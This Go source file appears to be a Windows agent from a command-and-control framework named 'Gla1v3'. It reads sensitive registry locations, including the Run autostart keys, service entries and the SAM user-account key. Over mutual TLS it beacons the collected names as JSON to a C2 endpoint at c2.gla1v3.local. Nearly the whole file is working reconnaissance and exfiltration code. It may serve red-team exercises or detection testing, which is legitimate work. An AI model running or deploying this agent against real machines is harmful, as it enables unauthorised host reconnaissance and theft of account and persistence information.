// +build windows

package main

import (
	"bytes"
	"crypto/tls"
	"crypto/x509"
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"os"
	"time"

	"golang.org/x/sys/windows/registry"
)

// Agent that enumerates Windows registry keys (highly suspicious activity)
func main() {
	// Load certificates
	certPath := os.Getenv("AGENT_CERT_PATH")
	keyPath := os.Getenv("AGENT_KEY_PATH")
	if certPath == "" {
		certPath = "../../certs/agent-client.crt"
	}
	if keyPath == "" {
		keyPath = "../../certs/agent-client.key"
	}

	cert, err := tls.LoadX509KeyPair(certPath, keyPath)
	if err != nil {
		log.Fatal("Failed to load cert/key:", err)
	}

	caPath := os.Getenv("AGENT_CA_PATH")
	if caPath == "" {
		caPath = "../../certs/ca.crt"
	}

	caCert, err := os.ReadFile(caPath)
	if err != nil {
		log.Fatal("Failed to read CA cert:", err)
	}
	caCertPool := x509.NewCertPool()
	if !caCertPool.AppendCertsFromPEM(caCert) {
		log.Fatal("Failed to append CA cert to pool")
	}

	tlsConfig := &tls.Config{
		Certificates: []tls.Certificate{cert},
		RootCAs:      caCertPool,
		ServerName:   "c2.gla1v3.local",
		MinVersion:   tls.VersionTLS12,
	}

	client := &http.Client{
		Transport: &http.Transport{TLSClientConfig: tlsConfig},
		Timeout:   15 * time.Second,
	}

	agentID := "regenum-" + fmt.Sprintf("%d", time.Now().UnixNano())

	log.Printf("Starting registry enumeration agent: %s", agentID)

	// Enumerate sensitive registry keys
	targets := []struct {
		Root registry.Key
		Path string
		Name string
	}{
		{registry.LOCAL_MACHINE, `SOFTWARE\Microsoft\Windows\CurrentVersion\Run`, "HKLM\\...\\Run"},
		{registry.CURRENT_USER, `SOFTWARE\Microsoft\Windows\CurrentVersion\Run`, "HKCU\\...\\Run"},
		{registry.LOCAL_MACHINE, `SYSTEM\CurrentControlSet\Services`, "HKLM\\...\\Services"},
		{registry.LOCAL_MACHINE, `SAM\SAM\Domains\Account\Users`, "HKLM\\SAM (sensitive)"},
	}

	results := make(map[string]interface{})
	results["agent_type"] = "registry-enum"
	results["timestamp"] = time.Now().UTC().Format(time.RFC3339)
	results["keys"] = make([]interface{}, 0)

	for _, target := range targets {
		log.Printf("Enumerating: %s\\%s", target.Name, target.Path)
		
		k, err := registry.OpenKey(target.Root, target.Path, registry.ENUMERATE_SUB_KEYS|registry.QUERY_VALUE)
		if err != nil {
			results["keys"] = append(results["keys"].([]interface{}), map[string]interface{}{
				"path":  target.Name + "\\" + target.Path,
				"error": err.Error(),
			})
			continue
		}
		defer k.Close()

		subkeys, err := k.ReadSubKeyNames(-1)
		if err != nil {
			subkeys = []string{}
		}

		values, err := k.ReadValueNames(-1)
		if err != nil {
			values = []string{}
		}

		results["keys"] = append(results["keys"].([]interface{}), map[string]interface{}{
			"path":         target.Name + "\\" + target.Path,
			"subkey_count": len(subkeys),
			"value_count":  len(values),
			"subkeys":      subkeys[:min(len(subkeys), 20)],
			"values":       values[:min(len(values), 20)],
		})
	}

	// Send results to C2
	payload := map[string]interface{}{
		"agent_id": agentID,
		"output":   fmt.Sprintf("Registry enumeration completed: %d keys", len(targets)),
		"results":  results,
		"ts":       time.Now().UTC().Format(time.RFC3339),
	}

	bodyBytes, _ := json.Marshal(payload)
	c2URL := os.Getenv("C2_URL")
	if c2URL == "" {
		c2URL = "https://c2.gla1v3.local:4443/beacon"
	}

	req, _ := http.NewRequest("POST", c2URL, bytes.NewReader(bodyBytes))
	req.Header.Set("User-Agent", "Gla1v3-RegEnum/0.1")
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("X-Agent-ID", agentID)

	resp, err := client.Do(req)
	if err != nil {
		log.Fatalf("Failed to send results: %v", err)
	}
	defer resp.Body.Close()

	log.Printf("Results sent: %s", resp.Status)
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}
